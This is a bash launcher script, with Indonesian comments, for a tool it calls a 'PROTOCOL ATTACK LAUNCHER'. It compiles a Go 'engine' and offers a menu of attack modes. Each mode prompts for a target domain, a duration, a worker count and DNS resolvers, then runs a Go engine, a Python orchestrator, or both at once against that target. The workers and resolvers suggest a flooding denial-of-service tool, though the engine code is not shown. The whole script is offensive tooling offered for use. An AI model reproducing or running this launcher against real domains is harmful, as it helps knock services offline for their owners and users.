#!/bin/bash
# EL CIENCO - GPA LAUNCHER
# Wrapper untuk menjalankan GPA dengan mudah

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗                    ║
║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝                    ║
║  ██║  ███╗███████║██║   ██║███████╗   ██║                       ║
║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║                       ║
║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║                       ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                       ║
║                                                                  ║
║              PROTOCOL ATTACK LAUNCHER v2310                      ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Check dependencies
check_deps() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    MISSING=""
    
    command -v go >/dev/null 2>&1 || MISSING="$MISSING go"
    command -v python3 >/dev/null 2>&1 || MISSING="$MISSING python3"
    command -v pip3 >/dev/null 2>&1 || MISSING="$MISSING pip3"
    
    if [ ! -z "$MISSING" ]; then
        echo -e "${RED}[!] Missing dependencies:$MISSING${NC}"
        echo -e "${YELLOW}[*] Install with: pkg install go python${NC}"
        exit 1
    fi
    
    # Install Python packages
    pip3 install aiohttp aiodns --quiet 2>/dev/null
    
    echo -e "${GREEN}[✓] All dependencies satisfied${NC}"
}

# Compile Go engine
compile_engine() {
    echo -e "${YELLOW}[*] Compiling GPA Engine (Go)...${NC}"
    
    if [ -f "gpa_engine.go" ]; then
        go build -ldflags="-s -w" -o gpa_engine gpa_engine.go
        chmod +x gpa_engine
        echo -e "${GREEN}[✓] GPA Engine compiled${NC}"
    else
        echo -e "${RED}[!] gpa_engine.go not found${NC}"
        exit 1
    fi
}

# Main menu
main_menu() {
    echo ""
    echo -e "${GREEN}Select attack mode:${NC}"
    echo "  1) Go Engine (High performance, 500+ workers)"
    echo "  2) Python Orchestrator (Advanced features, auto-discovery)"
    echo "  3) Full Attack (Both engines simultaneously)"
    echo "  4) Exit"
    echo ""
    read -p "Choice [1-4]: " choice
    
    case $choice in
        1) run_go ;;
        2) run_python ;;
        3) run_full ;;
        4) exit 0 ;;
        *) echo -e "${RED}Invalid choice${NC}"; main_menu ;;
    esac
}

run_go() {
    read -p "Target domain: " target
    read -p "Duration (seconds) [120]: " duration
    duration=${duration:-120}
    read -p "Workers [100]: " workers
    workers=${workers:-100}
    read -p "DNS resolvers [8.8.8.8,1.1.1.1]: " resolvers
    resolvers=${resolvers:-"8.8.8.8,1.1.1.1"}
    
    echo -e "${RED}[GPA] Launching Go Engine...${NC}"
    ./gpa_engine -t "$target" -d $duration -w $workers -r "$resolvers"
}

run_python() {
    read -p "Target domain: " target
    read -p "Duration (seconds) [120]: " duration
    duration=${duration:-120}
    read -p "Workers [100]: " workers
    workers=${workers:-100}
    read -p "DNS resolvers [8.8.8.8,1.1.1.1,9.9.9.9]: " resolvers
    resolvers=${resolvers:-"8.8.8.8,1.1.1.1,9.9.9.9"}
    
    echo -e "${RED}[GPA] Launching Python Orchestrator...${NC}"
    python3 gpa_orchestrator.py -t "$target" -d $duration -w $workers -r "$resolvers" -v
}

run_full() {
    read -p "Target domain: " target
    read -p "Duration (seconds) [120]: " duration
    duration=${duration:-120}
    read -p "Workers per engine [50]: " workers
    workers=${workers:-50}
    
    echo -e "${RED}[GPA] Launching FULL ATTACK (Both engines)...${NC}"
    
    # Run both in background
    ./gpa_engine -t "$target" -d $duration -w $workers &
    python3 gpa_orchestrator.py -t "$target" -d $duration -w $workers &
    
    wait
}

# Main
check_deps
compile_engine
main_menu
